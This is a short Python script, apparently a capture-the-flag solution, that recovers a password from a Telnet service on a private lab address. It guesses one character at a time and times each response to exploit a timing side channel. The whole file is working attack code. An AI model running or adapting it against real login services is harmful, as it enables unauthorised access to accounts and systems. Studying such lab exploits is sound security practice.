#!/usr/bin/env python
# encoding: utf-8

import socket
import sys
sys.path.append('/home/bluec0re/sources/pentesting_utils/ctf')
from telnetlib import Telnet
from pprint import pprint
from timing import timeit
import string

TARGET = ('192.168.56.101', 54311)

#s = socket.create_connection(TARGET)

tn = Telnet(*TARGET)
print(tn.read_until(b'in\n').decode())

#print(tn.read_until(b':').decode())

s = tn.get_socket()


def callback(pwd):
    s.send(pwd)
    data = s.recv(512)
    if b'succ' in data:
        raise Exception(pwd)

pwd = ''
s = tn.get_socket()
while True:
    timings = []
    for i, c in enumerate(string.ascii_letters + string.digits):
        sys.stderr.write("\r{}".format(c))
        pwd2 = pwd + c
        sec = timeit(callback, pwd2.encode())
        timings.append((pwd2, sec))

    print()
    timings.sort(key=lambda x: x[1])
    pprint(timings[0][0])
    pwd = timings[0][0]

